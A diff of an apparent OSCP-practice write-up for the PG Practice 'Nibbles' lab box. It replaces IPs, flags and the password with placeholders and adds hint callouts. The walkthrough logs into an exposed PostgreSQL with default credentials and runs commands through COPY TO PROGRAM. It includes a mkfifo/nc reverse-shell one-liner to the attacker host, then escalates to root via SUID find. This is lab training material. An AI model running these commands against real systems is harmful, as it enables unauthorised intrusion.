@@ -2,16 +2,16 @@
 tags: [oscp, boxes, pg-practice, linux, completed]
 platform: PG Practice
 os: Linux
-ip: 192.168.183.47
+ip: $BoxIP
 difficulty: Easy
 status: complete
-local_flag: 2fe8bd41588725cf3cedb4689bc8937d
-root_flag: fc2033af2f11d5f1809dad1734d7764b
+local_flag: $UserFlag
+root_flag: $RootFlag
 ---
 
-# Nibbles — PG Practice (Linux)
+# Nibbles -- PG Practice (Linux)
 
-> Note: This is **PG Practice Nibbles** — not HTB Nibbles (which is Nibbleblog file upload). Different box, different technique.
+> Note: This is **PG Practice Nibbles** -- not HTB Nibbles (which is Nibbleblog file upload). Different box, different technique.
 
 ## Box Info
 
@@ -19,7 +19,7 @@ root_flag: fc2033af2f11d5f1809dad1734d7764b
 |---|---|
 | Platform | PG Practice |
 | OS | Linux |
-| IP | 192.168.183.47 |
+| IP | $BoxIP |
 | Difficulty | Easy |
 | Status | Root |
 
@@ -43,7 +43,7 @@ Open ports:
 | 5437/tcp | PostgreSQL 11.3-11.9 |
 
 Closed: 139, 445 (SMB ports closed, not worth pursuing).
-UDP: all 100 top ports filtered — nothing useful.
+UDP: all 100 top ports filtered -- nothing useful.
 
 `shot nmap-allports`
 
@@ -53,7 +53,13 @@ UDP: all 100 top ports filtered — nothing useful.
 sudo nmap -sV -sC -p 21,22,80,5437 -oN services.nmap $BoxIP
 ```
 
-Key finding: PostgreSQL on non-standard port 5437 with SSL cert `commonName=debian`. Default port is 5432 — someone moved it but left it world-accessible.
+Key finding: PostgreSQL on non-standard port 5437 with SSL cert `commonName=debian`. Default port is 5432 -- someone moved it but left it world-accessible.
+
+> [!warning] 💡 Hint
+> A database on a non-standard port is still a primary lead when it is externally reachable. Record the exact port and version, then test authentication and capabilities rather than assuming the web service must be the entry point.
+
+> [!tip] ⚡ More efficient path
+> The service scan already identifies PostgreSQL, so move directly to a controlled credential test. Avoid spending time on closed SMB ports or blind web fuzzing after the HTTP response has shown no application.
 
 `shot nmap-services` (red box: `5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9`)
 
@@ -61,37 +67,40 @@ Key finding: PostgreSQL on non-standard port 5437 with SSL cert `commonName=debi
 
 ## Service Triage
 
-### FTP — Anonymous Login
+### FTP -- Anonymous Login
 
 ```bash
 ftp $BoxIP
 # user: anonymous, pass: <blank>
 ```
 
-Result: `530 Login incorrect` — anonymous FTP disabled.
+Result: `530 Login incorrect` -- anonymous FTP disabled.
 
-### HTTP — Port 80
+### HTTP -- Port 80
 
 ```bash
 curl -s http://$BoxIP/
 ```
 
-Bare HTML template placeholder — literally the stock "Enter a title" Apache demo page. No CMS, no web app, no useful paths. Dead end.
+Bare HTML template placeholder -- literally the stock "Enter a title" Apache demo page. No CMS, no web app, no useful paths. Dead end.
 
-### PostgreSQL — Port 5437
+### PostgreSQL -- Port 5437
 
 Primary target. Default credentials:
 
 ```bash
 psql -h $BoxIP -p 5437 -U postgres
-# Password: postgres
+# Password: $Password
 ```
 
 Connected. `postgres=#` prompt received.
 
 `shot postgres-access` (red box: `postgres=#` prompt)
 
-`loot cred postgres postgres`
+`loot cred postgres $Password`
+
+> [!abstract] 🧠 Why
+> Default credentials are useful because they give both authentication and a capability to test. The important follow-up is not merely “login worked,” but whether the database account is a superuser and can invoke an operating-system command primitive.
 
 ---
 
@@ -103,13 +112,16 @@ Connected. `postgres=#` prompt received.
 SELECT current_setting('is_superuser');
 ```
 
-Output: `on` — superuser confirmed. Required for `COPY TO PROGRAM`.
+Output: `on` -- superuser confirmed. Required for `COPY TO PROGRAM`.
 
 `shot postgres-superuser` (red box: `on`)
 
 ### RCE via COPY TO PROGRAM
 
-`COPY TO PROGRAM` passes the command string to `/bin/sh`. On Debian, `/bin/sh` is `dash` — bash-specific syntax like `>&` and `/dev/tcp` will fail.
+`COPY TO PROGRAM` passes the command string to `/bin/sh`. On Debian, `/bin/sh` is `dash` -- bash-specific syntax like `>&` and `/dev/tcp` will fail.
+
+> [!abstract] 🧠 Why
+> PostgreSQL executes the command through the target's system shell. A payload that works in an interactive Bash prompt can fail before it reaches the network if `/bin/sh` parses it. Separate command execution, egress, and shell syntax as three different tests.
 
 > [!warning] 💡 Hint
 > **Watch out:** PostgreSQL launches the command through the system shell, not automatically through Bash. Use shell-compatible syntax or explicitly invoke an available shell.
@@ -125,10 +137,10 @@ Output: `on` — superuser confirmed. Required for `COPY TO PROGRAM`.
 **Confirm RCE works (ping test):**
 
 ```sql
-COPY (SELECT '') TO PROGRAM 'ping -c 4 192.168.45.194';
+COPY (SELECT '') TO PROGRAM 'ping -c 4 $LocalIP';
 ```
 
-Watch with `tcpdump -i tun0 icmp` on Kali. ICMP arrived — COPY TO PROGRAM executes fine. Egress filtering is the issue, not the command.
+Watch with `tcpdump -i tun0 icmp` on Kali. ICMP arrived -- COPY TO PROGRAM executes fine. Egress filtering is the issue, not the command.
 
 **Check available tools (COPY FROM PROGRAM pattern):**
 
@@ -139,7 +151,7 @@ SELECT * FROM cmd_out;
 DROP TABLE cmd_out;
 ```
 
-Found: nc, nc.traditional, perl, python, python2, python3. nc IS installed — port 443 is blocked.
+Found: nc, nc.traditional, perl, python, python2, python3. nc IS installed -- port 443 is blocked.
 
 **Working payload (port 80 bypasses egress filter):**
 
@@ -150,7 +162,7 @@ sudo nc -lvnp 80
 
 Fire shell:
 ```sql
-COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 80 >/tmp/f';
+COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 80 >/tmp/f';
 ```
 
 Shell received as `postgres`.
@@ -177,7 +189,13 @@ export TERM=xterm
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-Key finding: `/usr/bin/find` — SUID set.
+Key finding: `/usr/bin/find` -- SUID set.
+
+> [!warning] 💡 Hint
+> SUID enumeration is only useful when you inspect the resulting binary list against known behavior. `find -exec /bin/bash -p` works because the root-owned SUID `find` launches Bash while preserving the effective UID.
+
+> [!tip] 🛠️ Alternative tools
+> If `find` is unavailable, review the rest of the SUID list against GTFOBins and check `sudo -l`, capabilities, scheduled tasks, and writable service files. Do not assume the database shell is already root.
 
 `shot privesc-finding` (red box: `/usr/bin/find`)
 
@@ -198,9 +216,19 @@ id
 
 ---
 
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| PostgreSQL is exposed on a non-standard port | Test default credentials and superuser status | Inspect SSL, roles, databases, and version-specific features |
+| `COPY TO PROGRAM` works but callback fails | Prove with ping, then choose an allowed port and shell | Use `COPY FROM PROGRAM` for command output or stage an SSH credential |
+| SUID `find` is present | Use `-exec /bin/bash -p` and verify `euid=0` | Check sudo, capabilities, cron, and writable service files |
+
+The completed chain follows the database capability and the SUID finding. A failed callback is not evidence that the SQL command primitive failed.
+
 ## Flags
 
-Both flags collected as euid=0 root — no need to compromise the `wilson` user separately. Root can read any file, including `/home/wilson/local.txt`.
+Both flags collected as euid=0 root -- no need to compromise the `wilson` user separately. Root can read any file, including `/home/wilson/local.txt`.
 
 ```bash
 cat /home/wilson/local.txt
@@ -209,14 +237,14 @@ cat /root/proof.txt
 
 | Flag | Location | Value |
 |---|---|---|
-| User (local.txt) | /home/wilson/ | `2fe8bd41588725cf3cedb4689bc8937d` |
-| Root (proof.txt) | /root/ | `fc2033af2f11d5f1809dad1734d7764b` |
+| User (local.txt) | /home/wilson/ | `$UserFlag` |
+| Root (proof.txt) | /root/ | `$RootFlag` |
 
 `shot user-flag` / `shot root-flag`
 `shot PROOF` (whoami + hostname + IP + root flag in one frame)
 
-`loot flag user 2fe8bd41588725cf3cedb4689bc8937d`
-`loot flag root fc2033af2f11d5f1809dad1734d7764b`
+`loot flag user $UserFlag`
+`loot flag root $RootFlag`
 
 ---
 
@@ -224,7 +252,7 @@ cat /root/proof.txt
 
 | Username | Password | Source | Used for |
 |---|---|---|---|
-| postgres | postgres | Default | PostgreSQL on port 5437 |
+| postgres | `$Password` | Default | PostgreSQL on port 5437 |
 
 ---
 
@@ -253,23 +281,23 @@ cat /root/proof.txt
 
 ## Lessons Learned
 
-1. **PostgreSQL on non-standard ports** — nmap shows port 5437 as `pmip6-data` by default because it doesn't know it's Postgres. The `-sV` service scan corrects this. Always run service scan, never trust the port number alone.
+1. **PostgreSQL on non-standard ports** -- nmap shows port 5437 as `pmip6-data` by default because it doesn't know it's Postgres. The `-sV` service scan corrects this. Always run service scan, never trust the port number alone.
 
-2. **Default `postgres:postgres` should be first try** — externally exposed PostgreSQL almost always has default creds on OSCP-level boxes. Don't overthink it.
+2. **Default `postgres:postgres` should be first try** -- externally exposed PostgreSQL almost always has default creds on OSCP-level boxes. Don't overthink it.
 
-3. **Check superuser before assuming COPY TO PROGRAM works** — `SELECT current_setting('is_superuser');` must return `on`. Non-superuser postgres accounts can connect but cannot execute OS commands.
+3. **Check superuser before assuming COPY TO PROGRAM works** -- `SELECT current_setting('is_superuser');` must return `on`. Non-superuser postgres accounts can connect but cannot execute OS commands.
 
-4. **COPY TO PROGRAM uses `/bin/sh`, not bash** — `>&` and `/dev/tcp` are bash-only. On Debian, `/bin/sh` is `dash`. Use mkfifo+nc or python3 for the shell payload.
+4. **COPY TO PROGRAM uses `/bin/sh`, not bash** -- `>&` and `/dev/tcp` are bash-only. On Debian, `/bin/sh` is `dash`. Use mkfifo+nc or python3 for the shell payload.
 
-5. **Diagnose egress before blaming the payload** — ping test (`COPY TO PROGRAM 'ping -c 4 ...'`) + tcpdump tells you instantly whether the execution works and whether egress is open. If ICMP arrives but TCP shell doesn't, it's a port filtering issue, not a payload issue.
+5. **Diagnose egress before blaming the payload** -- ping test (`COPY TO PROGRAM 'ping -c 4 ...'`) + tcpdump tells you instantly whether the execution works and whether egress is open. If ICMP arrives but TCP shell doesn't, it's a port filtering issue, not a payload issue.
 
-6. **COPY FROM PROGRAM for tool discovery** — when you need to know what's on the box but don't have a shell yet, `COPY cmd_out FROM PROGRAM '...'` reads stdout into a table you can SELECT from. Must append `; echo done` or similar to guarantee exit code 0 — COPY bails on any non-zero exit.
+6. **COPY FROM PROGRAM for tool discovery** -- when you need to know what's on the box but don't have a shell yet, `COPY cmd_out FROM PROGRAM '...'` reads stdout into a table you can SELECT from. Must append `; echo done` or similar to guarantee exit code 0 -- COPY bails on any non-zero exit.
 
-7. **Port 80 for egress (PG Practice pattern)** — TCP egress is filtered on most PG Practice boxes. Ports 80 and 443 are the first to try. ICMP is always allowed. See also: [[Bratarina]], [[Pebbles]].
+7. **Port 80 for egress (PG Practice pattern)** -- TCP egress is filtered on most PG Practice boxes. Ports 80 and 443 are the first to try. ICMP is always allowed. See also: [[Bratarina]], [[Pebbles]].
 
-8. **Root grabs all flags** — when you escalate to root before finding user flags, just `find /home -name local.txt` and read them directly. No need to pivot through intermediate users.
+8. **Root grabs all flags** -- when you escalate to root before finding user flags, just `find /home -name local.txt` and read them directly. No need to pivot through intermediate users.
 
-9. **PG Practice Nibbles vs HTB Nibbles** — completely different boxes. PG Practice Nibbles = PostgreSQL + SUID find. HTB Nibbles = Nibbleblog 4.0.3 file upload (EDB-38489). Don't confuse them.
+9. **PG Practice Nibbles vs HTB Nibbles** -- completely different boxes. PG Practice Nibbles = PostgreSQL + SUID find. HTB Nibbles = Nibbleblog 4.0.3 file upload (EDB-38489). Don't confuse them.
 
 ---
 
